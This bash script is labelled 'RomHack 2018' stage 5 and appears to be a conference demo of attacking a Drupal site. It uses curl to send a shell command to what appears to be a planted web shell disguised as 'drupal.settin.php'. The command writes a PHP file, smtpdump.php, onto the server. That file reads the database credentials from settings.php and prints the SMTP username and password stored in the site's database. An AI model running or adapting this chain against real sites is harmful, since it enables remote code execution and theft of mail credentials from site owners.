#!/bin/bash
echo "~~ RomHack 2018 ~~"
echo 
echo "STAGE5"
echo "Get SMTP info (user/pwd) stored on the DB"
echo "Write a PHP file smtpdump.php on the remote server"
echo
echo "smtpdump.php content:"
cat <<EOF
echo "<?php 
	require_once("settings.php");
	\$conn =  mysqli_connect(\$databases["default"]["default"]["host"], \$databases["default"]["default"]["username"], \$databases["default"]["default"]["password"]);
	mysqli_select_db(\$conn, \$databases["default"]["default"]["database"]);
	\$query = mysqli_query(\$conn, "select * from variable where name LIKE 'smtp_%'"); 
	while(\$row = mysqli_fetch_assoc(\$query)){ 
		echo \$row["name"] . "=" .\$row["value"];
	} 
?>" > smtpdump.php
EOF
echo 
read pippo
echo "------"
curl -v 'http://www.org.lan/sites/default/drupal.settin.php' \
	--compressed \
	-H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0' \
	-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
	-H 'Accept-Language: en-GB,en;q=0.5' \
	-H 'Connection: keep-alive' \
	-H 'Content-Type: application/x-www-form-urlencoded' \
	-H 'Upgrade-Insecure-Requests: 1' \
	-H 'Pragma: no-cache' \
	-H 'Cache-Control: no-cache' \
	--data $'c=echo "<?php require_once(\\"settings.php\\");\\$conn =  mysqli_connect(\\$databases[\\"default\\"][\\"default\\"][\\"host\\"], \\$databases[\\"default\\"][\\"default\\"][\\"username\\"], \\$databases[\\"default\\"][\\"default\\"][\\"password\\"]);mysqli_select_db(\\$conn, \\$databases[\\"default\\"][\\"default\\"][\\"database\\"]); \\$query = mysqli_query(\\$conn, \\"select * from variable where name LIKE \'smtp_%\'\\"); while(\\$row = mysqli_fetch_assoc(\\$query)){ echo \\$row[\\"name\\"] . \\"=\\" .\\$row[\\"value\\"];} ?>" > smtpdump.php'
echo "------"
echo
echo "Access: http://www.org.lan/sites/default/smtpdump.php"
echo
